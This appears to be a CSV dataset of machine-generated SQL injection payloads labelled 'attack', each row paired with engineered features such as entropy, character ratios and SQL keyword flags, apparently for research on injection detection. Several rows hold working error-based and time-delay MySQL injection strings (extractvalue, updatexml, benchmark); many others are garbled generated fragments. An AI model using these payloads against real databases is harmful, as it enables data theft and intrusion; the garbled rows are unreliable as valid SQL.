label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,",(  (  =  (  7982,concat  (  (  (  (  select   (  elt  (  e  (  3393  =  (  3393,,1   (  3576  =  (  (  0x2e,md5  (  0x4b774c75   end  (  (  elt  e  (  select   (  e  (  case 0 0 from d5  (  case when   (   (  ual  )   (  2914   (  4774  (  7982,concat  (  (  (  (  0x5c,0x7171706a71,0x7171706a71,  (  select   (  elt  (  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,10,327.0,32.0,3.5291986710380403,81.0,64.0,136.0,46.0,0.24770642201834864,0.19571865443425077,0.41590214067278286,0.14067278287461774,0.0,0.0,0.0,0.0,0.0,3.0,0.0,34.0,0.0,0.0,9.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,11,10.0,5.0,2.1219280948873624,0.0,1.0,4.0,5.0,0.0,0.1,0.4,0.5,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,12,155.0,28.0,3.8001745916373797,37.0,39.0,55.0,24.0,0.23870967741935484,0.25161290322580643,0.3548387096774194,0.15483870967741936,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    )     case  9338  1559 or updatexml  9490  (  (  (  (  (  1808,concat  (  (  (  (  (  (  0x2e,0x7171706a71,  (  select   (  el  (  0x5c,0x7171706a71,  (  select   (  elt  (  8862  (  (  1 as d   (n  (  elt  (  e(  0x2e,md5  (  (  0x2e,0x7171706a71,  (  extractvalue  (  5000000,md5  =  (  (  7982  =  (  1 else cast  (  (  (  0x5c,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,13,342.0,32.0,3.6552464001834526,86.0,76.0,131.0,49.0,0.25146198830409355,0.2222222222222222,0.3830409356725146,0.14327485380116958,0.0,1.0,0.0,0.0,0.0,2.0,0.0,35.0,1.0,0.0,10.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,14,159.0,31.0,3.787532415734454,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,")  (  1 alt  (  elt  (  1808  =  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  1297,concat  (  (  (  (  0x5c,  (  select   (  elt  (  0x5c,  (  (  benchmark  (  (  t  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  0x5c,0x7171706a71,0x7171706a71,  (  (  (  (  1808,concat  (  (  (  =  5530  (  8862,concat  (  (  (  (  1049  =  (  (  1808",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,15,369.0,29.0,3.636398303006807,83.0,98.0,130.0,58.0,0.22493224932249323,0.26558265582655827,0.3523035230352303,0.15718157181571815,0.0,0.0,0.0,0.0,0.0,3.0,0.0,41.0,0.0,0.0,14.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,16,10.0,5.0,2.1219280948873624,0.0,1.0,4.0,5.0,0.0,0.1,0.4,0.5,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,17,159.0,32.0,3.8126896484388566,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,2.0,2.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%""   )    )proicedure analyse  (  3539  )   (  (  (  elt   (  elt  (  1297  =  (  (  1759  (  1049  (  (  5000000,md5  (  0x2e,  (  4688  (  5000000(  (  5000000,md5  (  (  7982,concat  (  0x2e,0x7171706a71,  (  =  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  7982  =  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,18,308.0,33.0,3.659587178334154,61.0,82.0,117.0,48.0,0.19805194805194806,0.2662337662337662,0.37987012987012986,0.15584415584415584,0.0,1.0,0.0,0.0,0.0,3.0,0.0,34.0,1.0,0.0,9.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,19,165.0,28.0,3.6986474196389576,37.0,39.0,63.0,26.0,0.22424242424242424,0.23636363636363636,0.38181818181818183,0.15757575757575756,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""   where 1559 extractvalue  (  (  (  1808,concat  (  (  3393(  =  (  (  0x2e,0x7171706a71,  (  select   (  eltl  )  0x2e,  (  (  select   (  elt  )  0x2e,0x7171706a71,  (  (  9627,  (  (  0x2e,0x7171706a71,  (  9627,  (  (  (  0x2e,md5  (  (  1297  =  (  7982,1   from d5  (  elt  8862  =  (  (  1297  =  (  benchmark  (  1759(  (  3393  =  (  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,20,350.0,34.0,3.7618655663554583,77.0,92.0,129.0,52.0,0.22,0.26285714285714284,0.36857142857142855,0.14857142857142858,0.0,1.0,0.0,0.0,0.0,5.0,0.0,34.0,0.0,0.0,12.0,5.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,21,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,22,165.0,28.0,3.661125294687482,40.0,35.0,65.0,25.0,0.24242424242424243,0.21212121212121213,0.3939393939393939,0.15151515151515152,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%%""  =  ""end",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,23,158.0,27.0,3.761391753831221,42.0,35.0,57.0,24.0,0.26582278481012656,0.22151898734177214,0.36075949367088606,0.1518987341772152,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,3.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ')n(S7757  extractvalue  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  0x4b774c75   end  (  el  (  0x5c,0x7171706a71,  (  (  benchmark  (  5000000(  0x2e,concat  (  (  (  (  0x2e,  (  select   (  (  elt  (  e  (  0x2e,0x7171706a71,  (  extractvalue  (  (  (  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  elt  (  case when   (  9836  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,24,537.0,35.0,3.8078235892306216,159.0,124.0,185.0,69.0,0.29608938547486036,0.2309124767225326,0.34450651769087526,0.12849162011173185,2.0,0.0,0.0,0.0,0.0,2.0,0.0,49.0,0.0,0.0,16.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1%%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,25,147.0,27.0,3.72081108730649,39.0,35.0,53.0,20.0,0.2653061224489796,0.23809523809523808,0.36054421768707484,0.1360544217687075,0.0,2.0,0.0,0.0,0.0,1.0,0.0,10.0,2.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"select   (  9103  (  (  =  (  1808,1   (  5423  (  select extractvalue  (  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  1297,0x7171706a71,  (  (  select   (  1297,1   )    (  extractvalue  (  (  5000000(  (  7982  =  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  elt  )  0x5c,0x7171706a71,  (  (  t  (  benchmark  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,26,408.0,32.0,3.7767553554931257,105.0,110.0,136.0,57.0,0.25735294117647056,0.2696078431372549,0.3333333333333333,0.13970588235294118,0.0,0.0,0.0,0.0,0.0,2.0,0.0,41.0,0.0,0.0,14.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
